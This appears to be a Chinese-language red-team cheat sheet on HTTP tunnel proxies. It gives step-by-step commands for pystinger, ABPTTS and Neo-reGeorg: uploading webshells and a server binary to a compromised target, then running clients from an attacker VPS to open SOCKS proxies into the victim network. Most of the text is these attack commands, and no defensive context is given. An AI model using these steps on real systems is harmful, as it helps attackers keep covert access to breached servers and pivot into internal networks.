# HTTP隧道代理

#### pystinger隧道（socks4a）

1.上传proxy.jsp到目标服务器，确保可以正常访问。  

![](https://image.3001.net/images/20211119/1637286526_6197027e06387cd546f9a.png!small)

2.上传stinger_server.exe 到目标服务器，并start命令运行该程序

    
    
    start stinger_server.exe

vps 运行client端

    
    
    ./stinger_client -w http://example.com/proxy.jsp -l 0.0.0.0 -p 60000

![](https://image.3001.net/images/20211119/1637286601_619702c9509c3f77ceba7.png!small)

将会在vps的6000端口启用socks4a代理

#### Adptts代理

1.生成webshell：

    
    
    python abpttsfactory.py -owebshell

2.将生成的木马上传至目标靶机，出现一串hash即为成功

![](https://image.3001.net/images/20211119/1637286705_61970331f1fb0bdf53dc3.png!small)

3..攻击机执行：

    
    
    #将靶机的端口映射出来为攻击机本地端口  
    #攻击机地址和靶机地址通常设置为127.0.0.1  
    python abpttsclient.py -c webshell\config.txt -uurl地址 -f攻击机地址:攻击机端口/靶机地址:靶机端口

#### Neo-reGeorg（socks5）

1.设置密码，生成tunnel的webshell，并上传到目标服务器。

    
    
    python neoreg.py generate -k 自定义密码

2.使用neoreg.py连接webshell，并在本地建立socks代理

    
    
    python neoreg.py -k 密码 -u http://example.xx/tunnel.*(php/jsp/asp) -p 自定义端口

